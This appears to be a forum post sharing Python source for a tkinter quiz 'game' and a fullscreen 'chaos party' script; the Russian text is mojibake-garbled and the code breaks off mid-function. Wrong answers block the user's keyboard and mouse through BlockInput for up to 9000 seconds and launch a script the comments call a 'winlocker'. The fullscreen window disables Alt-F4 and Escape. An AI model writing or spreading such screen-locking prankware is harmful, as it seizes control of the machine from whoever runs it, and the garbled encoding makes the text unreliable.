—è —Å–¥–µ–ª–∞–ª –∏–≥—Ä—É.
–∏—Å—Ö–æ–¥–Ω–∏–∫–∏:

tkintertest.py:
import tkinter as tk
from tkinter import simpledialog, messagebox
import os
import time
import sys
import ctypes
import random
import math
import subprocess
import threading
from playsound import playsound
base_dir = os.path.dirname(os.path.abspath(__file__))
youwin8bit = os.path.join(base_dir, "win8bit.mp3")
russian_gimn = os.path.join(base_dir, "gimnrussia.mp3")
gameover8bit = os.path.join(base_dir, "gameover.mp3")

def play_sound(sound_file):
    """Play sound file using subprocess to avoid playsound Unicode issues"""
    try:
        # Use Windows Media Player to play the sound
        subprocess.Popen(['cmd', '/c', 'start', '/min', 'wmplayer', sound_file], 
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Error playing sound: {e}")
def roundthree():
     messagebox.showinfo("–ü—Ä–∏–≤–µ—Ç—Å–≤–∏–µ", "–ù—É —á—Ç–æ, –ø—Ä–æ—à–µ–ª –≤—Å–µ 2 —Ä–∞—É–Ω–¥–∞?–ú–æ–ª–æ–¥–µ—Ü. –∫–∞–∫ —Ç–µ–±–µ —ç—Ç–æ —É–¥–∞–ª–æ—Å—å? –ù–µ–≤–∞–∂–Ω–æ.—Å–∞–º—ã–π –º–∞—Å—à—Ç–∞–±–Ω—ã–π —Ä–∞—É–Ω–¥ 3 –Ω–∞—á–∞—Ç. 7 –≤–æ–ø—Ä–æ—Å–æ–≤. –∏ —É –∫–∞–∂–¥–æ–≥–æ —Å–≤–æ–µ. ")
     messagebox.showinfo("–ü—Ä–∏–≤–µ—Ç—Å–≤–∏–µ", "–í–æ–ø—Ä–æ—Å—ã –±—É–¥—É—Ç –º–æ—â–Ω—ã–º–∏.–æ—Ç–≤–µ—Ç —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –±–µ–∑ –ª–∏—à–Ω–µ–≥–æ. —Ç–æ–ª—å–∫–æ –¥–∞ –∏–ª–∏ –Ω–µ—Ç.–ø—Ä–∏–º–µ—Ä –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ:–î–∞. –ø—Ä–∏–º–µ—Ä –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ:–î–∞")
     question1 = simpledialog.askstring("–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å", "–°–∞–º–∞—è –±–æ–ª—å—à–∞—è –ø–æ –ø–ª–æ—â–∞–¥–∏ —Å—Ç—Ä–∞–Ω–∞?")
     if question1 == "–†–æ—Å—Å–∏—è".lower():
          playsound(youwin8bit)
          messagebox.showinfo("–ê —Ç—ã –∫—Ä—É—Ç.–ø–æ—Å–ª—É—à–∞–µ–º –≥–∏–º–Ω —Ä–æ—Å—Å–∏–∏!")
          playsound(russian_gimn)
          pass
     elif question1 == "—Ä—Ñ":
          playsound(youwin8bit)
     else:
          playsound(gameover8bit)
          messagebox.showwarning("–Ω–µ—Ç", "–ù–µ–≤–µ—Ä–Ω–æ!")
          pass
     question2 = simpledialog.askstring("–í—Ç–æ—Ä–æ–π –≤–æ–ø—Ä–æ—Å", "–ú–æ–∂–Ω–æ –ª–∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥ –Ω–∞ –∞—Ç–∞–∫–≤–∞–Ω–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ, –∏—Å–ø–æ–ª—å–∑—É—è —É—è–∑–≤–∏–º–æ—Å—Ç—å –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ –≤ –¥—Ä–∞–π–≤–µ—Ä–µ GPS-–¢—Ä–µ–∫–µ—Ä–∞ –Ω–∞ —Å–ø–∏–Ω–µ –∫—Ä–æ–∫–æ–¥–∏–ª–∞??").lower()
     if question2 == "–î–∞.".lower() or question2 == "–î–∞".lower():
          playsound(youwin8bit)
          os.system("python fireworks.py")
          pass
     else:
          playsound(gameover8bit)
          os.system("python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
          time.sleep(900)
          os.system("taskkill /f /im python.exe")
          sys.exit(0)
          pass
     question3 = simpledialog.askstring("–í–æ–ø—Ä–æ—Å3", "–î–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ª–∏ –∞—Ç–∞–∫–∏ –ß–µ–ª–æ–≤–µ–∫ –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ(MITM) –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ TLS-–¢—Ä–∞—Ñ–∏–∫–∞, –∏–¥—É—â–µ–≥–æ –º–µ–∂–¥—É —Å–µ–Ω—Å–æ—Ä–æ–º –∏ —Å–µ—Ä–≤–µ—Ä–æ–º, –µ—Å–ª–∏ —Ñ–∏–∑–∏—á–µ—Å–∫–∏–π –¥–æ—Å—Ç—É–ø –∫ –∫—Ä–æ–∫–æ–¥–∏–ª—É –µ—Å—Ç—å? " )
     if question3 == "–î–∞".lower() or question3 == "–î–∞.".lower():
          playsound(youwin8bit)
          messagebox.showinfo("–ú–æ–ª–æ–¥–µ—Ü!", "–¢–´ –∫—Ä—É—Ç!")
          os.system("python fireworks.py")
          pass
     else:
          messagebox.showwarning("–ù–µ–≤–µ—Ä–Ω–æ! –≤ —ç—Ç–æ—Ç —Ä–∞–∑ –±–µ–∑ —Å–∏–ª—å–Ω–æ–≥–æ –Ω–∞–∫–∞–∑–∞–Ω–∏—è. –Ω–æ –≤–≤–æ–¥ –±—É–¥–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –Ω–∞ 40 —Å–µ–∫—É–Ω–¥. –∏ —Ç—ã –≤—ã–±—ã–≤–∞–µ—à—å.")
          ctypes.windll.user32.BlockInput(True)
          time.sleep(40)
          ctypes.windll.user32.BlockInput(False)
          sys.exit(1)
          pass
     question4 = simpledialog.askstring("–ú–æ–∂–Ω–æ –ª–∏ –ø—Ä–æ–≤–µ—Å—Ç–∏ DDoS-–ê—Ç–∞–∫—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏—Å–ø–æ–ª—å–∑—É—è –±–æ—Ç–Ω–µ—Ç –∏–∑ —É—Å—Ç—Ä–æ–π—Å—Ç–≤, –∑–∞–∫—Ä–µ–ø–ª–µ–Ω–Ω—ã—Ö –Ω–∞ –∫—Ä–æ–∫–æ–¥–∏–ª–∞—Ö?")
     if question4 == "–î–∞".lower() or question4 == "–¥–∞.".lower():
          playsound(youwin8bit)
          os.system("python mega_fireworks.py")
          pass
     else:
          os.system("python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
          time.sleep(3600)
          os.system("taskkill /f /im python.exe")
          sys.exit(9)
          pass
     question5 = simpledialog.askstring("–§–ò–ù–ê–õ", "—ç—Ç–æ —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –≤–æ–ø—Ä–æ—Å.  –æ–Ω –Ω–µ–≤–µ—Ä–æ—è—Ç–Ω–æ —Å–ª–æ–∂–Ω—ã–π... –µ—Å–ª–∏ –≤—ã –ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ—Ç–≤–µ—Ç–∏—Ç–µ - –≤—ã –≥–µ–Ω–∏–π. –ø–æ–ª—É—á–∏—Ç–µ —Å–∞–º—ã–π –≥–ª–∞–≤–Ω—ã–π –ø—Ä–∏–∑!–≥–æ—Ç–æ–≤—ã?—Ç–µ–∫—Å—Ç:–í–µ—Ä–Ω–æ –ª–∏, —á—Ç–æ —á—Ç–æ –∑–∞–¥–∞—á–∞ –æ –≤—ã–ø–æ–ª–Ω–∏–º–æ—Å—Ç–∏ –±—É–ª–µ–≤—ã—Ö —Ñ–æ—Ä–º—É–ª –º–æ–∂–µ—Ç –±—ã—Ç—å —Ä–µ—à–µ–Ω–∞ –∑–∞ –ø–æ–ª–∏–Ω–æ–º–∏–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è –Ω–∞ –∫–≤–∞–Ω—Ç–æ–≤–æ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Å –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –Ω–∏–∑–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å—é –æ—à–∏–±–∫–∏, –µ—Å–ª–∏ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∫–≤–∞–Ω—Ç–æ–≤—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º, —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —Ä–µ—à–∞—è –ø—Ä–æ–±–ª–µ–º—É –ø–æ–∏—Å–∫–∞ –≥—Ä–æ–≤–µ—Ä–∞ –Ω–∞ N —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∑–∞ 0(sqrt(N)) —à–∞–≥–æ–≤, –∞ —Ç–∞–∫–∂–µ –ø—Ä–∏ —É—Å–ª–æ–≤–∏–∏, —á—Ç–æ –∫–ª–∞—Å—Å —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ BQP —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∫–ª–∞—Å—Å–æ–º –†–ù?")
     if question5 == "–ù–µ—Ç".lower() or question5 == "–ù–µ—Ç.".lower():
          messagebox.showinfo("–æ–≥–æ...", "–ß–ï–õ... —Ç—ã –≤—ã–∏–≥—Ä–∞–ª. –≤—Å—é –ø—Ä–æ–≥—É –ø—Ä–æ—à–µ–ª! —Ç—ã –¥–æ—Å—Ç–æ–µ–Ω. —Ñ–∏–Ω–∞–ª. –Ω–∞–∂–º–∏ –æ–∫ –∏ –ø–æ–ª—É—á–∏—à—å —Å–∞–º—É—é –≥–∏–≥–∞–Ω—Ç—Å–∫—É—é —Ç—É –Ω–∞–≥—Ä–∞–¥—É")
          os.system("python party.py")
          pass
     else:
          os.system("python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
          time.sleep(9000)
          os.system("taskkill /f /im python.exe")
          


     
     


     




    

    



        

        





def roundtwo():
            messagebox.showinfo("–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ", "–≠—Ç–æ –≤—Ç–æ—Ä–æ–π —Ä–∞—É–Ω–¥. –Ω–∞–≥—Ä–∞–¥–∞ –±—É–¥–µ—Ç –≤–µ–ª–∏–∫–∞.–ø–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å:–ø—Ä–∏–∑:–Ω–∏—á–µ–≥–æ. –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç - –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞ –Ω–∞ 70 —Å–µ–∫—É–Ω–¥.–≤—Ç–æ—Ä–æ–π –≤–æ–ø—Ä–æ—Å. –Ω–∞–≥—Ä–∞–¥–∞:(–Ω–∞–≥—Ä–∞–¥–∞). –Ω–∞–∫–∞–∑–∞–Ω–∏–µ:–Ω–µ –ø—Ä–∏–¥—É–º–∞–ª. –≤–æ–æ–±—â–µ–º –Ω–µ –±—É–¥—É —Å–ø–æ–π–ª–µ—Ä–∏—Ç—å" )
            bar = simpledialog.askstring("–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å", "–∞ –ø–æ—á–µ–º—É –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫?", initialvalue="")
            if bar == "–ü–û–¢–û–ú–£ –ß–¢–û –ö–†–û–ö–û":
                 messagebox.showinfo("–ü—Ä–∞–≤–∏–ª—å–Ω–æ!–Ω–∞–º–∏—Ç–µ –ª—é–±—É—é –∫–Ω–æ–ø–∫—É –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è –¥–∏—Å–∫–æ—Ç–µ–∫–∞. —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å –µ–µ - –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É win –∏ –∑–∞–∫—Ä–æ–π—Ç–µ –µ–µ.")
                 os.system("python party.py")

            elif bar == "–º–∞—Ç—Ä–∏—Ü–∞":
                 messagebox.showinfo("...", "–Ø –Ω–µ–Ω–∞–≤–∏–∂—É –ø–æ–ø—Å—É. —Å–∏—Å—Ç–µ–º–∞ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è –Ω–∞–≤—Å–µ–≥–¥–∞.")
                 os.system("python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
            else:
                 messagebox.showwarning("–í–Ω–∏–º–∞–Ω–∏–µ!", "–≤–≤–æ–¥ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è –Ω–∞ 8 —Å–µ–∫—É–Ω–¥")
                 
                 ctypes.windll.user32.BlockInput(True)
                 time.sleep(8)
                 ctypes.windll.user32.BlockInput(False)

            messagebox.showinfo("–í–Ω–∏–º–∞–Ω–∏–µ!", "–í—Ç–æ—Ä–æ–π –≤–æ–ø—Ä–æ—Å")
            answer2 = simpledialog.askstring("–í–æ–ø—Ä–æ—Å", "–ö–∞–∫–∞—è —Å–∏–ª–∞ —É–∫—É—Å–∞ –Ω–∏–ª—å—Å–∫–æ–≥–æ –ö–†–û–ö–û–î–ò–õ–¨–ß–ò–öüêä?")
            if answer2 == "–æ—Ç 3400 –¥–æ 5000 psi":
                 messagebox.showinfo("–ü—Ä–∞–≤–∏–ª—å–Ω–æ!‚úî")
                 playsound(youwin8bit)
                 if messagebox.askquestion("—Ö–æ—Ç–∏—Ç–µ —Ñ–µ–µ—Ä–≤–µ—Ä–∫?"):
                      os.system("python fireworks.py")
                      roundthree()
                     
                 else:
                     messagebox.showinfo("–û–∫")
                     roundthree()
                

                    
                    
                
                


                    

def main():
    
    root = tk.Tk()

    messagebox.showinfo('–í–Ω–∏–º–∞–Ω–∏–µ!', "—ç—Ç–æ –∏–≥—Ä–∞. –ø–µ—Ä–≤–≤–π –≤–æ–ø—Ä–æ—Å...", )
    
    # –ó–∞–¥–∞–µ–º –ø–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å
    a = simpledialog.askstring("–í–æ–ø—Ä–æ—Å", "–∞ –∫–∞–∫ –∫–∞–∫–∞—Ç—å?")
    
    if a == "—è —Ö–∑":
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º simpledialog –¥–ª—è –≤—Ç–æ—Ä–æ–≥–æ –≤–æ–ø—Ä–æ—Å–∞
        —ã = simpledialog.askstring("–ê–≥–∞!", "–ü–æ—á–µ–º—É?", initialvalue="")
        
        if —ã == "–ö–†–û–ö–û–î–ò–õ–¨–ß–ò–ö":
            messagebox.showinfo("–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º!", "–≤—ã –≤—ã–∏–≥—Ä–∞–ª–∏!")
            roundtwo()
        




        else:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏. —Å–∏—Å—Ç–µ–º–∞ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è –Ω–∞ 60 —Å–µ–∫—É–Ω–¥.")
            playsound(gameover8bit)
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –≤–∏–Ω–ª–æ–∫–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
            if os.path.exists("–ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py"):
                os.system("start python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
            else:
                messagebox.showwarning("–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω", "–§–∞–π–ª –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py –Ω–µ –Ω–∞–π–¥–µ–Ω!")
            
            # –ñ–¥–µ–º 60 —Å–µ–∫—É–Ω–¥ –ø–æ–∫–∞ –≤–∏–Ω–ª–æ–∫–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç
            time.sleep(60)
            ctypes.windll.user32.BlockInput(False)
            
            # –£–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å python (—ç—Ç–æ –∑–∞–∫—Ä–æ–µ—Ç –≤–∏–Ω–ª–æ–∫–µ—Ä)
            os.system("taskkill /f /im python.exe")

    
    else:
        messagebox.showerror("–û—à–∏–±–∫–∞", "–≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏. —Å–∏—Å—Ç–µ–º–∞ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è –Ω–∞ 9000 —Å–µ–∫—É–Ω–¥.–Ω–∞–∂–º–∏—Ç–µ FAQ –≤ —Ç–æ–º –æ–∫–Ω–µ –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å —á—Ç–æ —Å–ª—É—á–∏–ª–æ—Å—å.")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤–∏–Ω–ª–æ–∫–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
        if os.path.exists("–ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py"):
            os.system("start python –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py")
        else:
            messagebox.showwarning("–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω", "–§–∞–π–ª –ù–ï_–û–¢–ö–†–´–í–ê–¢–¨_clean.py –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        
    
        time.sleep(9000)


        ctypes.windll.user32.BlockInput(False)
        
        # –£–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å python (—ç—Ç–æ –∑–∞–∫—Ä–æ–µ—Ç –≤–∏–Ω–ª–æ–∫–µ—Ä)
        os.system("taskkill /f /im python.exe")



        
    
    # –ó–∞–∫—Ä—ã–≤–∞–µ–º tkinter
    root.destroy()

if __name__ == "__main__":
    main()

   
        



party.py:

import tkinter as tk
from tkinter import messagebox
import random
import math
import time
from PIL import Image, ImageTk
import io
import pygame
import base64
import winsound

class ChaosParty:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("–í–ï–ß–ï–†–ò–ù–ö–ê –•–ê–û–°–ê!")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
       
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –∑–∞–∫—Ä—ã—Ç–∏–µ (–Ω–æ –Ω–µ–Ω–∞–¥–æ–ª–≥–æ!)
        self.root.protocol("WM_DELETE_WINDOW", self.nope)
        self.root.bind("<Alt-F4>", self.nope)
        self.root.bind("<Escape>", self.nope)
       
        # –•–æ–ª—Å—Ç –¥–ª—è –≤—Å–µ–≥–æ –±–µ–∑—É–º–∏—è
        self.canvas = tk.Canvas(self.root, bg='black', highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
       
        # –°–æ–∑–¥–∞–µ–º –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–æ–≤ –∏–∑ base64
        self.crocodiles = []
        self.create_crocodiles()
       
        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ –≤–∏–¥—ã –±–µ–∑—É–º–∏—è
        self.start_chaos()
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∑–≤—É–∫–æ–≤—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã –≤–µ—á–µ—Ä–∏–Ω–∫–∏
        self.play_party_sounds()
       
    def play_party_sounds(self):
        """Play party music indefinitely."""
        try:
            # Initialize pygame mixer
            pygame.mixer.init()
            # Play random beep sounds in a loop
            self.play_random_sounds()
        except:
            pass
        
        # –í—ã—Ö–æ–¥ –ø–æ –∫–ª–∞–≤–∏—à–µ q
        self.root.bind("<q>", self.exit_party)

    def play_random_sounds(self):
        """Play random beep sounds"""
        try:
            frequency = random.randint(200, 1000)
            duration = random.randint(50, 300)
            winsound.Beep(frequency, duration)
        except:
            pass
        
        # Add mouse click sound effects
        self.canvas.bind("<Button-1>", self.play_click_sound)
        
        # Continue playing random sounds
        self.root.after(random.randint(100, 500), self.play_random_sounds)

    def play_click_sound(self, event=None):
        """Play sound on mouse click"""
        try:
            frequency = random.randint(300, 800)
            duration = random.randint(20, 100)
            winsound.Beep(frequency, duration)
            
            # Create visual effect on click
            self.create_click_effect(event.x, event.y)
        except:
            pass

    def create_click_effect(self, x, y):
        """Create visual effect on mouse click"""
        colors = ['red', 'blue', 'green', 'yellow', 'cyan', 'magenta', 'white']
        for i in range(8):
            angle = i * 45
            rad = math.radians(angle)
            dx = math.cos(rad) * 10
            dy = math.sin(rad) * 10
            color = random.choice(colors)
            particle = self.canvas.create_oval(x-3, y-3, x+3, y+3, fill=color, outline='')
            self.animate_click_particle(particle, dx, dy)

    def animate_click_particle(self, particle, dx, dy):
        """Animate click particle effect"""
        self.canvas.move(particle, dx, dy)
        
        # Fade out effect
        current_color = self.canvas.itemcget(particle, "fill")
        if random.random() < 0.2:  # Random disappearance
            self.canvas.delete(particle)
            return
        
        # Slow down
        dx *= 0.9
        dy *= 0.9
        
        if abs(dx) > 0.5 or abs(dy) > 0.5:
            self.root.after(30, lambda: self.animate_click_particle(particle, dx, dy))
        else:
            self.canvas.delete(particle)

    def exit_party(self, event=None):
        """Exit the party when q is pressed."""
        self.party_over()

    def nope(self, event=None):
        return "break"

    def create_crocodiles(self):
        """–°–æ–∑–¥–∞–µ–º —Å–ø—Ä–∞–π—Ç—ã –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–æ–≤ –∏–∑ base64"""
        croc_data = [
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAABCElEQVRYhe2WQQ6DMAwF/0E5cOQ+ZCRGjhw5j8TIsWckRoyMRGJkJEaOjERi5MiRkUiMHDlyHokxcuTIeSTGyJEj55EYI0eOnEdijBw5ch6JMXLkyHkkxsiRI+eRGCNHjpxHYowcOXIeiTFy5Mh5JMbIkSPnkRgjR46cR2KMHDlyHokxcuTIeSTGyJEj55EYI0eOnEdijBw5ch6JMXLkyHkkxsiRI+eRGCNHjpxHYowcOXIeiTFy5Mh5JMbIkSPnkRgjR46cR2KMHDlyHokxcuTIeSTGyJEj55EYI0eOnEdijBw5ch6JMXLkyHkkxsiRI+eRGCNHjpxHYowcOXIeiTFy5Mh5JMbIkSPnkRgjR46cR2L8A9WbZQZchykLAAAAAElFTkSuQmCC",
            "iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0ElEQVRIie2VMQ7CMAxF/6EcOHKfMRIjR46cR2Lk2DFGYsTISCQSI0eOjERi5MiR80iMkSNHziMxRo4cOY/EGDly5DwSY+T8/Hm9XvV8PuvxeNT9ftftdqvr9arL5aLz+azT6aTj8ajD4aD9fq/dbqftdqvtdivP8+Q4jizLkmmaMgxDmqZJVVUpiiJZlqUoimRZlgzDkK7r0jRNqqpKURTJsiwFQSBd16VpmlRVlaIokmVZCoJAuq5L0zSpqipFUSTLshQEgXRdl6ZpUlVViqJIlmUpCALpui5N06SqqhRFkSzLUhAE0nVdmqZJVVUpiiJZlqUgCKTrujRNk6qqUhRFsixLQRBI13VpmiZVVaUoimRZloIgkK7r0jRNqqpKURTJsiwFQSBd16VpmlRVlaIokmVZCoJAuq5L0zSpqipFUSTLshQEgXRdl6ZpUlVViqJIlmUpCALpui5N06SqqhRFkSzLUhAE0nVdmqZJVVUpiiJZlqUgCKTrujRNk6qqUhRFsixLQRBI13VpmiZVVaUoimRZloLgDdM7ZQZchykLAAAAAElFTkSuQmCC"
        ]
       
        for data in croc_data:
            try:
                image_data = base64.b64decode(data)
                image = Image.open(io.BytesIO(image_data))
                photo = ImageTk.PhotoImage(image)
                self.crocodiles.append(photo)
            except:
                pass
       
        # –ï—Å–ª–∏ –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–∏ –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∏—Å—å, —Å–æ–∑–¥–∞–µ–º –ø—Ä–æ—Å—Ç—ã–µ —Ñ–∏–≥—É—Ä—ã
        if not self.crocodiles:
            for _ in range(5):
                self.crocodiles.append(None)

    def start_chaos(self):
        """–ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ –∞–Ω–∏–º–∞—Ü–∏–∏ —Ö–∞–æ—Å–∞"""
        self.create_floating_text()
        self.create_bouncing_shapes()
        self.create_rainbow_background()
        self.create_fireworks()
        self.create_floating_crocodiles()
        self.create_rotating_shapes()
        self.create_pulsating_circles()
        self.create_mouse_trail()
        self.create_spinning_text()
        self.create_screen_shake()

    def create_floating_text(self):
        texts = ["–•–ê–û–°!", "üéâ", "–í–ï–ß–ï–†–ò–ù–ö–ê!", "üêä", "–ë–ï–ó–£–ú–ò–ï!", "‚ú®", "–ö–û–î–ò–ö–ò!", "üöÄ"]
        for i in range(20):
            x = random.randint(0, self.root.winfo_screenwidth())
            y = random.randint(0, self.root.winfo_screenheight())
            text = random.choice(texts)
            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta', 'white'])
            item = self.canvas.create_text(x, y, text=text, font=("Arial", random.randint(20, 48)),
                                         fill=color, tags="floating_text")
            self.animate_text(item)

    def animate_text(self, item):
        dx = random.randint(-5, 5)
        dy = random.randint(-5, 5)
       
        def move():
            nonlocal dx, dy
            self.canvas.move(item, dx, dy)
            coords = self.canvas.coords(item)
            if coords[0] > self.root.winfo_screenwidth() or coords[0] < 0:
                dx = -dx
            if coords[1] > self.root.winfo_screenheight() or coords[1] < 0:
                dy = -dy
            self.root.after(50, move)
       
        move()

    def create_bouncing_shapes(self):
        shapes = []
        for _ in range(15):
            x = random.randint(50, self.root.winfo_screenwidth()-50)
            y = random.randint(50, self.root.winfo_screenheight()-50)
            size = random.randint(20, 60)
            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta'])
           
            if random.choice([True, False]):
                item = self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline='')
            else:
                item = self.canvas.create_rectangle(x, y, x+size, y+size, fill=color, outline='')
           
            shapes.append({'item': item, 'dx': random.choice([-4, -3, -2, 2, 3, 4]),
                          'dy': random.choice([-4, -3, -2, 2, 3, 4])})
       
        self.animate_shapes(shapes)

    def animate_shapes(self, shapes):
        for shape in shapes:
            self.canvas.move(shape['item'], shape['dx'], shape['dy'])
            coords = self.canvas.coords(shape['item'])
           
            if coords[0] <= 0 or coords[2] >= self.root.winfo_screenwidth():
                shape['dx'] = -shape['dx']
            if coords[1] <= 0 or coords[3] >= self.root.winfo_screenheight():
                shape['dy'] = -shape['dy']
       
        self.root.after(30, lambda: self.animate_shapes(shapes))

    def create_rainbow_background(self):
        colors = ['#ff0000', '#ff7f00', '#ffff00', '#00ff00', '#0000ff', '#4b0082', '#8b00ff']
        current_color = 0
       
        def change_bg():
            nonlocal current_color
            self.root.configure(bg=colors[current_color])
            self.canvas.configure(bg=colors[current_color])
            current_color = (current_color + 1) % len(colors)
            self.root.after(200, change_bg)
       
        change_bg()

    def create_fireworks(self):
        def create_firework():
            x = random.randint(100, self.root.winfo_screenwidth()-100)
            y = random.randint(100, self.root.winfo_screenheight()-100)
            color = random.choice(['red', 'blue', 'green', 'yellow', 'cyan', 'magenta', 'white'])
           
            for angle in range(0, 360, 15):
                rad = math.radians(angle)
                dx = math.cos(rad) * 5
                dy = math.sin(rad) * 5
                particle = self.canvas.create_oval(x-2, y-2, x+2, y+2, fill=color, outline='')
                self.animate_particle(particle, dx, dy)
           
            self.root.after(random.randint(500, 2000), create_firework)
       
        create_firework()

    def animate_particle(self, particle, dx, dy):
        self.canvas.move(particle, dx, dy)
        if random.random() < 0.3:  # –°–ª—É—á–∞–π–Ω–æ–µ –∏—Å—á–µ–∑–Ω–æ–≤–µ–Ω–∏–µ
            self.canvas.delete(particle)
            return
       
        # –ó–∞–º–µ–¥–ª–µ–Ω–∏–µ
        dx *= 0.95
        dy *= 0.95
       
        if abs(dx) > 0.1 or abs(dy) > 0.1:
            self.root.after(30, lambda: self.animate_particle(particle, dx, dy))
        else:
            self.canvas.delete(particle)

    def create_floating_crocodiles(self):
        for i in range(min(10, len(self.crocodiles))):
            x = random.randint(50, self.root.winfo_screenwidth()-50)
            y = random.randint(50, self.root.winfo_screenheight()-50)
           
            if self.crocodiles[i] is not None:
                item = self.canvas.create_image(x, y, image=self.crocodiles[i])
            else:
                # –ü—Ä–æ—Å—Ç–∞—è –∑–∞–º–µ–Ω–∞ –µ—Å–ª–∏ –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–∏ –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∏—Å—å
                item = self.canvas.create_text(x, y, text="üêä", font=("Arial", 36))
           
            self.animate_crocodile(item)

    def animate_crocodile(self, item):
        dx = random.choice([-3, -2, -1, 1, 2, 3])
        dy = random.choice([-3, -2, -1, 1, 2, 3])
       
        def move():
            nonlocal dx, dy
            self.canvas.move(item, dx, dy)
            coords = self.canvas.coords(item)
            if coords[0] > self.root.winfo_screenwidth() or coords[0] < 0:
                dx = -dx
            if coords[1] > self.root.winfo_screenheight() or coords[1] < 0:
                dy = -dy
            self.root.after(40, move)
       
        move()

    def create_rotating_shapes(self):
        stars = []
        for _ in range(8):
            x = random.randint(100, self.root.winfo_screenwidth()-100)
            y = random.randint(100, self.root.winfo_screenheight()-100)
            size = random.randint(20, 40)
